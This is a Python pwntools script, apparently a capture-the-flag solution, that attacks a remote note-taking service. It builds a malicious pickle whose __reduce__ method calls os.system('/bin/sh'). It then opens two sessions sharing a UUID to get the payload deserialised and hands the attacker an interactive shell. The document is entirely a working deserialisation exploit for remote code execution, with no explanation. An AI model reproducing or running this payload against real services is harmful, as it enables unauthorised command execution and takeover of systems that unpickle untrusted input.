import pickle as cPickle
import base64
from pwn import *

class Exploit(object):
  def __reduce__(self):
    import os
    fd = 20
    return (os.system,
            ('/bin/sh',))

HOST, PORT = 'secret-pickle.420blaze.in', 420
sock = lambda: remote(HOST, PORT)
r = sock()
r.sendline('n')
r.recvuntil(': ')
uuid = r.recvline()[:-1]
r2 = sock()
r2.sendline('y')
r2.sendline(uuid)
r.sendline('a')
r2.sendline('a')
r.sendline('0')
r.recvuntil('Read Note')
r2.sendline('1')
r2.sendline('0')
r2.sendline('a')
payload = (cPickle.dumps(Exploit(), protocol=0))
r2.sendline(payload)
r2.sendline('')
r.sendline('1')
r.sendline('a')
r.interactive()

